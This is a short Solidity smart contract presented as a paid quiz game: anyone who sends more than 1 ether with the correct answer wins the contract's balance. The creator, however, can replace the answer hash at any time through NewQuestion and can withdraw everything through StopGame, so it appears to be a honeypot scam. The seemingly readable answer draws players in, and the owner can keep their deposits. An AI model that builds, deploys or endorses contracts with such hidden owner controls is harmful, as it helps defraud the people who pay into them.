1 pragma solidity ^0.4.20;
2 
3 contract play_to_quiz
4 {
5     function Try(string _response)
6     external
7     payable
8     {
9         require(msg.sender == tx.origin);
10         
11         if(responseHash == keccak256(_response) && msg.value>1 ether)
12         {
13             msg.sender.transfer(this.balance);
14         }
15     }
16     
17     string public question;
18  
19     address questionSender;
20   
21     bytes32 responseHash;
22  
23     function start_play_to_quiz(string _question,string _response)
24     public
25     payable
26     {
27         if(responseHash==0x0)
28         {
29             responseHash = keccak256(_response);
30             
31             question = _question;
32             
33             questionSender = msg.sender;
34         }
35     }
36     
37     function StopGame()
38     public
39     payable
40     {
41        require(msg.sender==questionSender);
42        
43        msg.sender.transfer(this.balance);
44     }
45     
46     function NewQuestion(string _question, bytes32 _responseHash)
47     public
48     payable
49     {
50         require(msg.sender==questionSender);
51         
52         question = _question;
53         
54         responseHash = _responseHash;
55     }
56     
57     function() public payable{}
58 }